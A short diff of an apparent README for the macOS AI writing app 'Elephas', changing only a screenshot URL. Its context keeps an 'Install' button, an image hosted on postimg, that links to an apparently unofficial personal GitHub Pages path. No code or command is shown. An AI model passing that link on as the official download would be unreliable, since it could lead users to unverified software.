@@ -3,7 +3,7 @@
 <p align="center">Native AI writing assistant for macOS — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
 <p align="center"><a href="https://slavik-busterenko.github.io/.github/elephas"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
-<p align="center"><img src="https://prod.superblogcdn.com/site_cuid_cl495vqej08071jpawt8inf39/images/image-cp-1746770760827-compressed.png" alt="Elephas — macOS AI writing assistant for macOS screenshot" width="780"/></p>
+<p align="center"><img src="https://prod.superblogcdn.com/site_cuid_cl495vqej08071jpawt8inf39/images/image-cp-1753268697756-compressed.png" alt="Elephas — macOS AI writing assistant for macOS screenshot" width="780"/></p>
 
 ---
 
